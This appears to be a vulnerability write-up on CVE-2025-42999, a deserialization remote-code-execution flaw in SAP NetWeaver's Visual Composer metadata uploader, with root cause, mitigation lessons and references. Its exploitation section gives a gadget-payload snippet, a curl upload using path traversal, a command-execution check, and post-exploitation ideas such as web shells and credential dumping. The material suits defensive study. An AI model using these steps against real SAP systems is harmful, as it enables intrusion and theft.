# CVE-2025-42999 — SAP NetWeaver Visual Composer Metadata Uploader Deserialization Vulnerability

### Overview

- **CVE ID:** CVE-2025-42999  
- **Published:** May 2025  
- **Severity (CVSS):** 9.1 (Critical)  
- **Affected Software/Versions:** SAP NetWeaver Application Server Java - Visual Composer Metadata Uploader (SAP NetWeaver 7.50)  
- **Vulnerability Type:** CWE-502 Deserialization of Untrusted Data leading to Remote Code Execution (RCE)  

**Summary:** This vulnerability stems from the Visual Composer metadata uploader (`/developmentserver/metadatauploader`) blindly deserializing attacker-controlled Java objects. By uploading a crafted serialized payload exploiting known gadget chains (e.g., Commons-Collections), an attacker can achieve arbitrary code execution on the SAP server. When combined with CVE-2025-31324, it becomes a full pre-auth, single-request RCE.

**Updated (Oct 2025):** This writeup documents CVE-2025-42999 (the Visual Composer metadata uploader deserialization RCE) and remains accurate for that attack vector; since publication, a separate high severity deserialization flaw (CVE-2025-42944) affecting the RMI-P4 module has been disclosed and patched by SAP, and SAP now recommends JVM-wide hardening such as jdk.serialFilter in addition to component fixes. Readers should treat CVE-2025-42999 and CVE-2025-42944 as distinct but complementary risks

---

### Context

- **Visual Composer** is a design-time tool inside SAP NetWeaver for building UI components and applications.  
- It exposes a **metadata uploader** endpoint to receive project artifacts in serialized form.  
- The uploader does not enforce any class-whitelisting or integrity checks on incoming serialized data.  
- **Deserialization vulnerabilities** allow attackers to craft object graphs that trigger arbitrary method invocation during the read process, effectively achieving RCE.

---

### Root Cause

- The metadata uploader accepts arbitrary serialized Java objects.  
- No whitelist of allowed classes, no digital signature or checksum verification.  
- SAP’s deserialization routine trusts all classes on the application classpath, including gadget classes.

---

### Exploitation (Step-by-Step)

#### 1. Gain Upload Capability  
Attackers can either  
- Authenticate with valid SAP admin credentials, or  
- Chain with CVE-2025-31324 to bypass authentication altogether.

#### 2. Craft the Malicious Serialized Object  
Generate a gadget chain payload using Commons-Collections:

```java
// Gadget payload generator
ExploitGadget gadget = new CommonsCollectionsGadget("calc.exe");
byte[] payload = GadgetUtils.serialize(gadget);
Files.write(Paths.get("exploit.bin"), payload);
```

#### 3. Upload via Metadata Uploader  

```bash
curl -v -X POST https://victim.sap.local/developmentserver/metadatauploader \
  -H "Content-Type: multipart/form-data" \
  -F "file=@exploit.bin" \
  -F "path=../../../../apps/sap.com/vc~wd~ext/metadata/exploit.bin"
```

#### 4. Trigger Deserialization  
Invoke a Visual Composer operation (e.g., project import) that reads and deserializes the uploaded `exploit.bin`.

#### 5. Confirm Remote Code Execution  

```bash
curl "https://victim.sap.local/VC/root/exploit.bin?cmd=whoami"
# Output: sidadm
```

---

### Post Exploitation

With RCE as the SAP application server user, attackers can:  
- Deploy persistent web shells or reverse shells  
- Dump database credentials or SAP logon tickets  
- Pivot laterally across the SAP landscape  
- Launch fileless attacks by loading additional gadget chains from memory  

---

### Proof of Concept

A minimal PoC script is available at `poc/exploit.py`. It demonstrates:  
- Generating a Commons-Collections serialized payload in memory  
- Uploading via multipart POST with path traversal  
- Triggering deserialization and verifying command execution  

> ⚠️ Note: The provided PoC is for controlled lab environments only.

---

### Lessons Learned

1. Never deserialize user-supplied objects without strict class whitelists.  
2. Gadget chains in common libraries (Commons-Collections, Spring, etc.) remain a high-risk vector.  
3. Privileged-user flaws can escalate to pre-auth RCE when chained with unauthenticated bugs.  
4. Employ defense-in-depth: authentication, input validation, and secure deserialization frameworks.  
5. Monitor logs for anomalous multipart POSTs and deserialization exceptions.

---

### References

* SAP Security Note 3604119 — Patch for CVE-2025-42999  
* SAP Security Patch Day May 2025 Bulletin — Deserialization Fixes  
* Onapsis Labs: Chaining CVE-2025-31324 & CVE-2025-42999 for Pre-Auth RCE  
* CVE Details Entry: CVE-2025-42999  
* Threat Reports: Qilin, BianLian, RansomExx exploiting deserialization in the wild